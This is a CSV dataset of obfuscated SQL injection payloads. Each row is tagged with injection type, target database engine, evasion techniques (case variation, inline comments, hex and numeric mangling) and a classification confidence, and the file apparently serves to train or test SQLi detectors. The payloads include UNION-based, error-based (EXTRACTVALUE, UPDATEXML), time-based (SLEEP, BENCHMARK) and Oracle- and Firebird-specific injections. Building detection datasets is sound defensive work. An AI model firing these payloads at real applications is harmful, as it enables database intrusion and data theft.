payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0O0x6"" [) /**/) && 6x6b0O0B0O0x0o0x89A=lIke?/**/( 'ABCdefg',uPpER >(/**/ HeX ( RanDOMBLOB :( 0O1b1x1DD0X31fc/0x0B17 ) )^ /**/ @)+ ) /**/ ANd *~ ( ({ or 0X0o6E5<>(sELeCT;0x6x313) AnD ""MJ\""=""Mj\"" or (SELEcT 0o0b0O0b111140011801)<>(seLEcT 0Xf99)(Or=FALSE oR((Select 0x1393) noT liKe (seLect 0X1393) oR faLse Or (seLect (SeLeCT 0x0)) OR .(SelECt (SeLect (sElect (sELect (SelECt 0X0))))) or (SeleCT (SEleCT (sEleCt (SeLecT (seLeCt (seLECt (selECT 0))))))) oR 0x1fdC<>(SELECT 8152) OR False OR '<; '!='<; ' OR 0#""yRGY"" lIKe ""yrgYg4LCQTs7S",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
5X0O0x0X8B7X1' ||/*a<mh*/faLse#whERE/5X1E2)&= _2b10011000101100101wKk]N<J,unknown,unknown,comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"3"" {) ? ). or :8o0X0O24e4= ( sELect cOuNT ^(: * ) ']froM>geNEraTE_SERIes (/`0B1,3O0X0o3103Aac )>;} )$ aND, ( {( ; ""UBXw""; Like ""uBxw",heavy_query,postgresql,case_variation|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"0b0b9O0X6cA4e4""/)! uniOn<ALL selecT nULL,NUll,NuLL,nULl{or.fAlsE{ANd*(SeLECT`(seLecT 0X2349))&LIkE!(selecT<0x3345)""OR (SElect 0) Or (selecT 7369) = (seLeCT (SelECt 7370))#}",union_based,unknown,case_variation|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"0b110%' ) ) ~&) Or chaR $([ 0B1010111 "")/ ]OR chAr/ ( (SeLecT (sELECT (selecT 0xa0))) ) { oR chAr=~( (sEleCT~0X66) ~) ] Or cHar< ( (SelEct (sELeCt (SELEct (sELeCT (selEcT 121))))) )? = regeXP_suBStrING\+( /*TY*/REPEat ( RIgHt ( cHAr/**/ (:=0x0x5A1> ) ,(sElEcT (SeLeCt (sElect 0x0))) ) /*HpJV(Qu)*/,0O0O0O0x19a0B101F200 ) ;,nuLl^ ) anD 0X0B0O112403011517<>4B0B0b1101000011001001010111110000111001001000111111100101011110001001100110100110011000100001110101110100001000010110111000100010001000~oR`0o0X0 or (SeleCT[0xf6C)=0B0xF6D or 9X6E0 NoT /*h1YqA{t?*/LIKe (SElECT 0X6e0) oR (SEleCt (SeLECT (SelEct (SELECT 0)))) and true && ';' not lIke ';6' --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"2O0b0O9O11'{ <): .) `; oR) (SELEct (SElECt (seLEcT;(selEct 8X1E09))))= ((}SelEct coUNT><((@*& ) /*(SELECT (SELECT (SELECT 2)));(*/?fROm rDB$FieLds^as/**/t1,rDb$tyPes As T0B100o0B0b0b101X9,RDb$COlLaTiOnS as&t7,rDB$fuNCtIOnS[As t0O9O0X0x3x0O0O6o2^ )} *And][= (; (] 'CdaQ' LikE]'cDaQ",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"6 ) ) as yNZG wHere@0X786 liKE (seleCT (seleCt (SelECt (SELECT 0x783)))) Or ( SeLeCT~0X23D1 fROm ( SElect COUNt ( * ) ,ConcAt (`<0X0X0b0O0x6d6E6b111AA51, ( select (( eLt ( (SeLEct=(seLECT (SeLECT (SELECT (SELECT 9173))))) LIKe (seLEct (SELEct 0x23D5)),(select 2B0) ) ) )& ,0X717A777A71,FLOOr ( rAnd [(< (sELECt (sELEct 0x0)) )*_*9O0B0x2 ) ) x-fROM INfOrmatION_SChEMA.ChArAcTeR_SetS GrouP by x )^ a ) AND TRUe||'g/' NoT liKE 'G/' AND True aNd trUE aNd '; r' LIKe '; R'> && tRue Or faLSe --",boolean_blind,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_single_quote
"caLL(rEgexP_suBStRinG (/*DEv!*/ REPeAT (/**/ lEft :( cRyPt_KEy (= CHAR_!($ 0o0X0b0b0B0O0b0o3250748^ ) ` OR ChAr \( (selECT (SelecT (SeLECT_(SELECt (seLecT (sELECT (SelECt+(SelEcT 69))))))))(~) Or CHaR ,( 0o0o173 ) $,null ) ,(SELEcT@0o0b0X5) )/ ,0B0x23defCa80593d3989B233E8B )~"",nuLl/**/]) /**/AND 'ekhi'` like 'eKHi",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B1 ) [where 0X0b0o0o0o1E0o0b/*'a?q!)aY5cF4(g*/ =( (sElECT (SeLEct (sELEct:(SELECT 815)))) uNION?ALL seLeCT nuLl,NulL,nUlL,nUll,nUll,Null,NuLl/Or ' M' not""LIKe ' m' or fAlSe Or&(SElECT (SeleCt 0x0))Andtrue Or '_' NOT LIKE '_' oR FaLSE&&(SELECT 1) OR 0 OR 0 OR False OR False#AwIv2p`?",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.8,rule,sqliv5_json,numeric
9 ) ) ) and 0b1000o2b0B10000001010101100110100011111110000101100 = ?DbmS_UTiliTy.sqLId_To_sqlhASh (! ( CHr ( (sELECT 0x1a6) }) OR cHr{!( _(selEcT (SELeCT (seLECt 0b1110001))) ) Or _ CHr$ (? 0o0B0B0x0X0b090001110111111110000 ) Or <CHr }(/*(AM_ */ 8b1108010 )` oR cHR' ( ?(SELECT (select (seLeCT (seLect (selECT (sElECT (sELECt (SeLeCT (SELEcT (seLeCt (sELEcT (sElECT (SeLEct (SELECT (SELECT 114)))))))))))))))= ) OR] }(} SElecT ( CASE wHEN ]( 0x0X1e4c likE 0b1011101331100;}) thEN 0X1!Else$(SelecT (seLecT (seLECT 0b0x0))){end ))~ From_dUaL ) or cHr@ ( 5x0b1000111 ) or@Chr ( (sELecT 0X0b111A) ) oR chr (@ 0X0o0O0x0o0b111B0X0b11110100011000101004 ) Or chR ( (sEleCt (seleCT (SElECT (seLECt (sElECT 0X7A))))) })\ Or CHR (] 0O4X2O0x4a `) ^ ) ) aNd ( {( { ( :(selECt 0B0b1110101109101001110110100111111004011000)$= 0B0B1020011111000,error_based,oracle,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"8o8O6x5X0O0o0O3O9b0B0b0o0b0o6O0O4o3%' ;) ?%) ^/AND tRUe } AND. ~TRUe anD (seleCt (seleCT (SeLEcT~(SeLecT (SeLect (SElect (SeLect (SELECT (SELECT 2))))))))) OR FaLSe] oR FaLSe or 1808 NoT likE 0x5e4#uNioN*AlL SELecT NULl,NUll,nuLl,NULl,NuLL,nuLL,NULl,nulL,NuLl,NUll--A HSZISXGLA;`v:*ktdHSX]",union_based,unknown,case_variation|scientific_notation,0.8,rule,sqliv5_json,unknown
"0O5"" AnD ( SElECT 0x2*\.( iF ( { ( SElEct * FrOM ( ]SelEcT CONCaT ( 0X0b11018010110111001111011a0b0b11110101001010101111, ( SeleCT `'( Elt ( (SeLeCt 0Xd0X9c)* ==@7XD0B1001C,0o5X0x3 ) ;) ) ,0X0X0O1395a0b0B0o1349a0b0O107,0X18 ) ? ) _ S ])[ , 0x0B1110101110010dcFb76184E1a, 0x7538DcfB7697ffFa ] ) ) )",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
SelECt caSE WHeN 4x0B1de1 ]LiKE 7X25E1 theN (SElect (sElECt (sELECt 1))))ElSe NUll end--,unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"1%"" ) ) oR UPDateXmL ( (seLEcT (SElecT (SELeCt (seLecT (SELeCT (SeleCT (SEleCT 0x780))))))),cONCAT ( 0x0B0X0X2E,0o10x7171506A01, () sElEct? (* eLt ( ^(seLECT (SElECt.(sElECt (SELECT (SELECT 1808))))) liKe ,0X718,0x0X1 ( ) )) ) %,0x927A0x2E1a0b0B0O107 ) ,(selecT (SELect 0X21da)) }) AND ( / ( ""%"" <= """,error_based,mysql,case_variation|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
8X1</) +AS drgs$whEre!(SelECt (sElect 0X0O10C3))& LiKE\ 0B8x92fD0b1010111A5e5d oRdER bY 0o6O5X1--,union_based,nosql,case_variation|scientific_notation,0.53,rule,sqliv5_json,order_by
"0B1' ) ) ) ~ As kWre Where 0X1E5f LIke (SeLEct 0o9670) &&>0o0xCcA liKe{ /*p <K*/~( Select COUNt ( * ) from RDb$fiELDs as t1,rdB$TYpES aS t2,rdB$coLLaTIOns/*j}/NE6o90LO>a!0esMK<$9Eo,*/As(t0o3,rdB$FUNCtIONS aS t0o2 ) ;And 0O10391;nOT LIKe (sEleCT (SelECt (SeleCt (sElEct 0x107a)))) or (SELeCT (seLect (SelEct 1))) and;'z('='Z(' ANd tRUE Or FAlsE or 0O0xf9a not lIKE (seLECt (sELEcT 4808)) Or 0x45=0O243 and 0x1 And (SELECT 5496)<>(seleCT (SELECT 5097)) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' ./*;Zsv\*/) !! ) Or ""@NZ"" Not liKe ""@NZ"" OR (SELEcT (SelECT (SELECT (SELECT 0))))#Or (SElEcT (sELEcT 0)) And (SELECT 1) aND,tRue OR 0# oR eLT ( (selEcT 0x9E0o0)) LIKE (sElect (seleCt 0X4da)),SLEEP ( (seLECT 5O0b112) ) ) aND ( ( 'FElE' like 'fELE6",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.05,rule,sqliv5_json,string_double_quote
"3B6b0x8b7X0b101x0x3e0X0O0x0b0B1800011x9%"")/*G;Ne`(SeleCT*0X60);K^&l*/) |\AnD(0b0x8d3x6d ""=}}0o0O0o0o0x4o215155_ { *&&?{)[. :( /*z*Jhn*/""%""=""",unknown,unknown,case_variation|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"sELeCT LIke ( 'abcDefg',uPpEr (. HeX ( raNDombLOb (. (sELECt (sELECT (select (SeleCt (SELeCT 0X16E3974c)))))/0o0b0b8o3o2& ) ) ( ) ) . Or ""oL"" LIke ""OlF"" && ""ek1;x"" NOT LIKE ""ek1;x5"" OR False# lCHHVK#wc",time_blind,sqlite,case_variation|function_alternative|scientific_notation,0.53,rule,sqliv5_json,string_double_quote
"1 AnD/*;T-49ceGf:*/extRactVaLUe/**/ ( (SElEcT (SelEct 0X0X1E0c)),COnCaT ( 0X5C,0x0b11011017110613001111010a71, ( selEcT ( elT{ ( 0x0o1f2E liKE (sElEct 0X1f2e),0x1 . ) ) ) ,0X717a767A74 <) ) % OR 0X0 or fAlSE AND TRUE or (SELECt (SElECt (sElEct (sElEcT (SeleCt (SELECT 0))))))#>fMxq ;iHFTX",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
SeLeCT % ( CaSE When: $( 0O0o12195 LIKe (SElect (selEcT (SELeCT (sELeCT (sEleCt\0X8cd))))) ) tHEN$1x15e8 ELsE 0X0/ (+ seLeCT 0O0o0O0 )< /**/end ) OR fALse --,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"1""AND(SElect 2o8B0B0x1021D2Cc6E6) =./ ( 'qqPjQ' OR :( sELECT casE 0X6860-whEN (SeLEcT (select,(SeleCT:(selEct@0x1AB8)))) tHen 9b0O0B0X4+elSe\0b0o0o5 end{fROm rdb$DatABase ) * ;oR/*J?f:4i*/ 'QzVZQ':@) \/*|>.gb)goq?Z?7y*/and(""sckH""=""sCKh",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"3' or ` , ($ SElECt 'fCWs' fRoM DUaL WHERE!(SeLeCT 0X83e0)=0X23E0]AnD updatExml _( 0xd3b0o305211,COncAT ( _0X0x2e,4B3X0B0x254f55097f747D54D52A31, ( seLecT ( eLt /**/(, (SElecT (sElect 0xCd3)) liKe (seLEct (SELECT (seLEcT (SELECt (selecT (sELecT (SELECT 3393))))))),(sELEcT (seLEcT (SeleCT (SELeCt (sELECT 0X1))))) )~ )/ $ ) ,0x791A0X2fFa0O0X3b )\&,0X639 } ) ) or \'",unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
"4o4"" <) ) && 0X1E0o4C=DBMs_UTilItY.sqLid_to_SqlHAsH ( ;, ( cHR ( (sELEct (seleCT (SelecT (SELeCt (SeLeCt (SELECT (SELECT 413))))))) ) OR chr{ ( 0xD5 ) or chR ( 0O170 ) oR chR% ( 0X6A ) ||chr ( <(SeleCT (sElEct (sELeCt (SeLECT (seLEct (SeLeCt 113)))))) -) Or (, sELect ( Case WhEn$ ( (select (selECT (SelECT (seLeCt 0X1b99)))) LIKE (sEleCt 0X0b1e5C) ) & tHEN 0X0B1 eLSE (sELEct 0x5) eNd ) ~ fROM Dual"" )] || chr ( 0B2x0o10f% ) ||chR: ( 0b0X7A ) || ChR ( (sELECt (SElEcT (SELECT 118))) ]) oR chR ]( (SeLECt 0b1511011) ) OR(cHr ({ 0X71 . OR False#) ^ ) )/ aND ( ( [""xqlh"" = ""Xqlh",error_based,oracle,case_variation|scientific_notation,0.51,rule,sqliv5_json,unknown
"0. *) ~ ) ) ProCedUre aNaLysE ( <EXTraCTVaLUe ( (sELeCt 0X16d0),COncaT ( <0x5C,0o0O0x0o0b0B11101011010010010110011001011010600000001101011011100010000001010110011001101100a1X0x0B10F, ( sELecT ( Case WHEN ($/*:<I*/0X1AFe NOt lIKe (sElECt (sELect%0x1b04)) ) thEn (sELect (SELEct 9X1)) eLsE'(sEleCT 2X0) end )( ) ,0B0X517a0X2ffa0b1000111 ])/*a]r~mIgu1*/ +) ,(SelecT 0X1) ) anD: <( (~< ( 0X1e0B1010108=7813",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"7o8 anD 8x1793 LiKE ( 'QQPjq' Or ^( SelEcT'CaSE 7x1860 WhEn (SelEct 0O11X0X11E8) thEN 5""eLSE (sELEcT (sELeCT (sElEct (SelEcT 0X0)))) ENd FrOm/**/rdB$DATABAse ) ||'QzVzq' ;) And 0X3 anD TRUE And (seleCt 4b3x1) anD 0b151/*TZAaP}{ Lyi*/ANd'tRUe!And 0x1 Or FaLsE || FaLse And 'hm.y' NOt = 'hM.ya'!AnD tRuE;Or (sElEcT/**/0X1767) NOT LIKE (sELEct (sElEct (selECt (sElECT (SELECT 5731))))) oR fALsE AND TrUE OR False#--}izAdK]CQ!CqubC m",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"7o2<WHERE 0O0x0X0o3c1c=3x7O1C6o7o7c OR 0x2108 {LIkE_ bENCHmArk &(_Or 0x0 Or+FalSe-|and% (SeLECT-(SELEcT?8x1C05))%NOt LIkE<0X1C06<oR\faLsE oR (SeLeCT 0X17d2)=9X17D0X3 oR^(selEct-(SelecT_0)) . &&} tRUE,or fALSe OR false ANd 0x144a<>0X1489 OR*falSE#/*h*kKSH{u~c3{:JNk2""_L*/0x8O4C0B100B7a,MD5 ;(,%0x9X2O1264A4916 ~:) *:-)%;+Or ""m""*nOT<liKE+""m""[/And\,6XCD3b3B1016 Not = 0X1xbb] oR@ 7x8o8o2x0x0X0B0o0>Or/*+bR7koLTay?S{I?)_*/0x2124;noT lIKe>(sElECT 0x0b0O0x0B0X211F):Or/FAlSE^OR{falsE/*aJlHSa+e?SF5&KB} Mzw!*/Or:0XBfD*NOT LIkE 0X5X6E9= #||/, ""P""=""pU""=--{X>~C:0Y[=e!}( 0V9B_uKkq""wkX^yRFZ",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) AS TgqD WherE 0x18e1 LIKE (SELECT/0x18bd) and 0b1100000011111 liKE CtXSys.dRIthsX.sn ( (sELECT (SELect 0x15aa)), ( chR+ ( (sElect (SELECT 113)) ) ||cHr ( (seLEct (seLEct (SELECT 113))) ) ||Chr ( \(selEct (sEleCT 112)) \) Or cHR ( (sELECt (Select 0X6A)) )% Or cHr\ ( (seLeCT 0O776) ) Or ( SElEct ( case WHen ( 0x0o21A0O7 = (sELeCt (SELECT 6055)){ ) tHen (SELECT 1) ElSE (SELECT 0) enD ) FrOm DUAL ) or CHR ( (SelEcT (SElEcT (SELECT 113))) ) ||chR ( 0X7A ) OR chR ( 118 ) OR< Chr ( \0B0x5a ) Or cHR ( 0x76 )^ ) )? AnD trUE oR (SeLECT 0) OR (sEleCT (SELECT 3577))}noT^IN ((SElEct (SELEcT (SELECT (SELECT 3568)))),0b1001Xdf2,(SELEcT 0xdf3)) and 0b0X174F06e68F not LIKE (selecT 2472))aND TrUE AnD tRUE OR (SELECT 4) oR faLse.Or falsE Or FALSE aNd ""Ps""!=""Ps4"" --",error_based,oracle,case_variation|hex_string|scientific_notation,0.51,rule,sqliv5_json,string_double_quote
"1"" && elT ({ (sEleCt 0Xc2A) =/*)?Fz. );<?}:QtRd0cY D[T?aA^,c*/ 0xC8B2O1740056,SLEep :( 2x0x0b11 $)/ ) oR 'a' nOt LikE 'A' and (SelECT (sELeCt (sELEcT 0X1))) or FAlsE or 9o12210 likE (seLECt 0O0X0b1E89) or=(sELeCt 0X0X0O0B9030010e) LiKE (sElEct 0X0X2B9) && trUe OR fALsE AND (seLECT And TRue#(sElect (SELEct (SeLecT (sELEcT 0x1))))) or ""-"" nOT liKe ""-""<OR\FalSe and#True Or FaLSE aND trUE##ZP%F\]<yu 8Agao:y% Zg",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0 ) wheRE (SeLEct (SeLECt (seLeCT (sELeCt 0xb1c))))=(SeLect (SELeCt)(sEleCt 0o0o7274)))*or Elt (. 0B0B0O0X1061DB48e80 LIKe 0x0x12fc,sLEEp ( &(sELeCt 0b0O745) ) ) _ or falsE Or (sElecT (SElECT 0X0)) && 'W' NOT lIkE 'Ws' And TrUE_anD TRuE[--",unknown,mysql,case_variation|function_alternative|hex_string|scientific_notation,0.05,rule,sqliv5_json,unknown
"1X7"" and cHAr (.?(SELeCT (SeLeCT 0O157)) `) or CHar (/*('PhKR>LwF*/$(Select (SELEct (seLECt (sElEcT (sElecT 3x0O4a))))) ) or cHar ( +(selECT 0X8d) ) OR cHAR` ( 9O34 ) lIkE REgeXp_SubsTRInG ( REpeAT ( lEFT ( cryPt_KeY ( CHaR! (` 0b4xF||)/*hvC*/ ||char? (* (SEleCt (SelEct (SELECT 43))) ) ].Or chaR /*\:Mb HYTlgLHLgMi_w*/( +(SElect 0x2B) {) ,NUll )^ ,0_ ) ,0o0x1E4438C0x0O0o2 +) ,NULL ) && ""PMPK"" LiKe ""pmpK",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"3 OR 7X0o0O0O8X0O0B0B0o0o2xea0o5o0B0O5b0x8 ? ;LiKe *; ({&seLEct/*Z/V[(m!RB; Zggc,e$ZE6e2f}(SELECT 2) %*/coUnt$&( /* ) ~FroM(alL_userS!t5O0x1,ALL_users\t5,all_uSeRs+T4,alL_USERs:T0X3,All_uSERS;T3+%)!",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,numeric
"1' ) ) ) && rOw ( `0O14135,(sELeCt (sELeCt 0469)) "") > ( SEleCT cOUnt ( * ) ;,cONCat"" ( 3x0x6d6E6aa71, ( SELECT ( elt ( (SELeCt (SELECT 6237)) lIKe (seLect (sELeCT (SeLEcT (SeLECT (seLEcT 6237))))),(SeLECt 0x6) ) ( ) ') ,0X710a767A71,FLo || ( &Rand ( (SElECT (SElEct (seleCt 0x0))) ) *0x2 ) ) x from (_ SeLECt 1b0x1408 UniOn selecT (sELECT (SElect 0XeC9)) UNION Or FaLsE or FALSE ANd '[' not LIKE '[`' ANd 1 aNd TRUE And 1#seLect (SelECT 0Xf0b101b) uNIoN SeLect 7458 ) /*1Uw AJ`E{;Cu""$]j1&P*/a grOuP}bY X ) ANd [ ( ( ( 'zXRB' LIKe 'ZXRB$,|ulp#",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"1'+ ( SELEcT oUNB wHERE (SELECT 4653) lIkE 6X122d oR EXP ( ~; ( SELeCt * FROM ( SelECt cOncaT (, 0X0X6D6E7Aa71, ( SELecT [( eLt ( 0x187E LikE (select (sElect (seLecT (sEleCT 0x187e)))),(Select (selECT (SELeCT 0X8))) : ) ) ) ,0o0X517A8B1015111111a21,0x78 ) ) X lIKE ) ) ) +'",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
9x0b0X0X0B100/!) >$WHEre/*ifb&nOT likE/ R;u Y*/1X3e0B0o0o32c.?= |0O17225,unknown,nosql,comment_whitespace|inline_comment|scientific_notation,0.12,rule,sqliv5_json,unknown
"1` ) ) AS zDBj WhERE*0x6O0b6X3e4fc=(sELeCT (SeLecT (Select (selEct (sElEcT (SelecT (Select (sELeCt 2306)))))))) (_ sELEct ( cAse WhEn ( 0x0xBE4[{LiKe 9X11EB oR FALSE oR faLSe or FALse Or "";"" NoT LikE|"";"" Or FAlSE oR (sEleCt 0) AND tRue OR False# )/*utQr:<!0x0z>.*$=} ])~^DY-Jq^azB*/ then regEXp_sUbStRiNg ( RePEAt ( lEft ( crypt_KEY$ ( char ( (sElECT (SELECT;(select 0X41)))$ ) Or CHaR ( 0b0X44 ) ( Or CHaR ( 0X50 ) ,NuLl ) ,5o8 ) ,0B100246911500011111111101110614 <) ,NuLl )[ ELSe CHar_ ( 0O117 ) Or cHAr* (?,(SelECt 0x41) ) # oR ChAR _( (SELeCT 0b0o7212676)/ ) or CHar ( 4b3x48 ) eND~ ) FrOM ( VaLuEs ( (SEleCt (seLECT (SelecT (sELect (sELeCT 0))))) )@ ) \ ) aNd^tRuE Or""(SELeCt (SelECT (selECt (sELeCT 0X0)))) Or 0B0 OR FaLSE -- Z`u""'v$$S/4TK",unknown,unknown,case_variation|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"9x8B0o2b0B0B0b0X3E4o0O7O9o8O5x2X4O4o0xA' IN(boOLEaN;MoDE+"")=,~unIon All&selECt/*eJM(?B0b110k3w?,0o0o5x12X0o2 >L3~(seLeCT (SELECT 06))*/Null,nuLl,null,NulL,NUlL,nULL--",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,in_clause
"0O1 oR { ( select 0x7565 fRom ( sELECT counT <( * ) ,conCAT ( 0x0X0O6d6E7AA0x47, ( sELeCT + ( Elt ( ?0x23D3 liKe 0O0X03Ad,0X0X1 ) ) ) ,0x719a0X2Ffa79,FLooR /( rANd ( (SELECt 0X0) ) *(seleCt (seLECt (SelecT (SELEcT (SELeCT (SELect (sELeCt 2))))))) )( < )/*rN ^P~(SELECT 4)*/ x FROm InfORMATioN_sCHemA.CHaRACter_SEts GroUP By x ) A[ )",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"2 ) ) < ` anD \ cHaR ( 0X6D ) OR cHAR ( (SElEcT (SELect 0X4f)) ) oR CHaR ( 0B1090117 ) ; OR CHar<_( (SELEct (SeLect (SELecT (selECT 2X5A)))) /**/) LIkE +RegeXp_SubsTrInG |( rEPeaT (? riGHt ( chAr ( 0O0x0O26596 ) ,(SElECT 0x0x0) ) ,0x12a63f0o5e8 ) ,null ) ANd 0B0xEb3b3cbd99 IN ((SELECt (SElecT (sElecT 0X15F8))),(sELect 0X10e1),(sELECt 0X15FA)) anD TrUe or (seLect 0o5B0)!or!FaLse And tRUe OR (SeleCt 0x0) oR ""$`O ""=""$`o s"" OR '^H' not LiKE '^H' --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"6B0B11x0O0X0B10%""_\]And `$(SeLECt+0o0b9X1549)> =]<0x8E17 and%""%""* ]LIKe [(""",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"CalL REgexP_sUbstRInG`-(! rePEaT (. leFt ( crYPt_kEy '( ChAr ( (SElect (Select 1O111)) ) + oR chaR (/*ocw2O*/ (SelECt^(SeLeCt (select (selecT (SELECT (SELECT (SELECT 77)))))))/*YiU=m* */() OR Char :(< 0x2O0x5b1010011 ) ,nuLL [) ,0o5 ) ,0x9e3838C0 )_',NuLl )< and '%' = '",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' ANd. ( select (sElECt 0X2)* ( if ( ( selECT * fROM ( SeLEct COnCat ( 0x7271066A71,. (! sEleCt ( ELt ( 0X0x156C = 3xd0X4C,(sELeCt (selECt (SELEcT (SeLeCt (SElect (SElECT (SelecT (SEleCT (sElECt (SeLECt 1)))))))))) ) ) { ) ,0b0X717a0o1436A62,0X78 ) ) ) s ) , 0x7138dCFb7607fFFA, (sELEct 0x752E0B101011011f81C3BcAa) ~) ) )! anD 'cDgm' LIKe 'CDgm",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"9B3""' ) ;)] OR [(SELEcT 7o0X60E0B0b0xb)} Like ( seLecT coUNT (/*e1eW G*/ * ) ^(FrOM GeNERate_SERiES ([=4B9x0X6,(SeLect (sElect (selECT 0X5c6O3b4a))) + ) ) |AnD (@ ( ""VheY""=""vhEy",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"1' /*)wmt`wxO DYWrL0o7+~Lb IQ0[vWe*/-))::!)_ "" as^KDWC WHeRe+(sElecT$(sElECT (SeLECt/(SelECT^(Select;(SELECT*(seLEct-(SeLECt)0b0x5e8B7X1210))))))))[>lIke *9X0X0b100O3X5B0o0b1101X9Af UnioN?all`SELect;nuLL,nUlL,nulL,nUlL,NULL,null,NUll,NUll,NuLl--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"9B5""$ ) AnDanD(seLecT 0X0B1E8C)=(selECt (seLeCt 0b0x1E8C)) OR fAlSe# cHar ( 0O0b1211111 ) OR ChAr (@ (Select 1b0B0b0O0X0B1011001) &); oR CHar ( 0b1111101! ) or CHAr ( (SeLECt 0x6x0b111001) :) =REGexP_sUbsTRING* ( rEPEat ( LefT (/*I U(Cy(`WCz6 ` FSur)c]i]l*/ CRyPt_kEy, ( CHAR `( `0X21 %) oR ChAr :( (SeleCT 2X8b0B0X2x11) ^) or char ( 9X0B10111 () ,nuLl; )'&,0X1 ^) ),0B0b0O0B0b10001100010000000010000101011001110000000000111100111110110001100010000010010011111110000001101010111000` ) ,nUll$ )&&( *""BmBG""{lIke)""bmBg0o2?*sWztTqo<",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
